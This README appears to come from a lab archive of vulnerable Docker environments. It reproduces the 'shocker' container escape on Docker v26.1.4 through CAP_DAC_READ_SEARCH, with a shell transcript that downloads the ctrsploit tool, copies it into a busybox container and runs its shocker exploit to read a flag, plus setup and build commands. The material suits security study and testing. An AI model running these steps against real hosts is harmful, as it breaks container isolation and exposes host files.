# docker v26.1.4

* dqd:
  * ssst0n3/docker_archive:shocker_docker-v26.1.4 -> ssst0n3/docker_archive:shocker_docker-v26.1.4_v0.1.0
  * ssst0n3/docker_archive:shocker_docker-v26.1.4_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_shocker_docker-v26.1.4 -> ssst0n3/docker_archive:ctr_shocker_docker-v26.1.4_v0.1.0
  * ssst0n3/docker_archive:ctr_shocker_docker-v26.1.4_v0.1.0

## reproduce

There's no shocker vulnerability in docker v26.1.4 , but we can use shocker as an exploit technique when use `--cap-add CAP_DAC_READ_SEARCH`

```shell
root@localhost:~# ./poc.sh 
+ wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O ctrsploit
+ chmod +x ctrsploit
+ docker run -tid --name poc --cap-add CAP_DAC_READ_SEARCH busybox
Unable to find image 'busybox:latest' locally
latest: Pulling from library/busybox
3d1a87f2317d: Pull complete 
Digest: sha256:82742949a3709938cbeb9cec79f5eaf3e48b255389f2dcedf2de29ef96fd841c
Status: Downloaded newer image for busybox:latest
c27f1b82f272b47100ad6d143d7b38dddf4d28f11b960949a7e60a62c2b56eba
+ docker cp ctrsploit poc:/usr/bin/
Successfully copied 10.6MB to poc:/usr/bin/
+ docker attach poc
/ # 
/ # 
/ # ctrsploit checksec shocker
[Y]  shocker	# Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.

/ # ctrsploit exploit shocker
/proc/self/fd/7 # cat flag
flag{escaped}
```

## env

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd vul/shocker/shocker_docker-v26.1.4
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

```shell
root@localhost:~# docker version
Client: Docker Engine - Community
 Version:           26.1.4
 API version:       1.45
 Go version:        go1.21.11
 Git commit:        5650f9b
 Built:             Wed Jun  5 11:28:57 2024
 OS/Arch:           linux/amd64
 Context:           default

Server: Docker Engine - Community
 Engine:
  Version:          26.1.4
  API version:      1.45 (minimum version 1.24)
  Go version:       go1.21.11
  Git commit:       de5c9cf
  Built:            Wed Jun  5 11:28:57 2024
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.33
  GitCommit:        d2d58213f83a351ca8f528a95fbd145f5654e957
 runc:
  Version:          1.1.12
  GitCommit:        v1.1.12-0-g51d5e94
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

## build

```shell
make all DIR=vul/shocker/shocker_docker-v26.1.4
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_shocker_docker-v26.1.4_v0.1.0
```